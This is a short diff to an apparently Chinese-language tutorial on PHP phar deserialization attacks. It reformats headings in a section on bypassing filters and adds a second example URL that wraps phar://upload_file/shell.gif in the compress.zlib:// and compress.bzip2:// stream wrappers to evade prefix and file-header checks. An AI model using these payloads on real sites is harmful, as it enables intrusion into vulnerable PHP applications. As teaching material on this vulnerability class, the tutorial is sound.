@@ -153,13 +153,14 @@ $phar->stopBuffering();
 
 ## 绕过
 
-#### 绕过字符串头部过滤
+### 绕过字符串头部过滤
 
 ```
 demo.php?filename=compress.bzip2://phar://upload_file/shell.gif/a
+demo.php?filename=compress.zlib://phar://upload_file/shell.gif/a
 ```
 
-绕过文件类型监测(文件头)
+### 绕过文件类型监测(文件头)
 
 ```php
 <?php
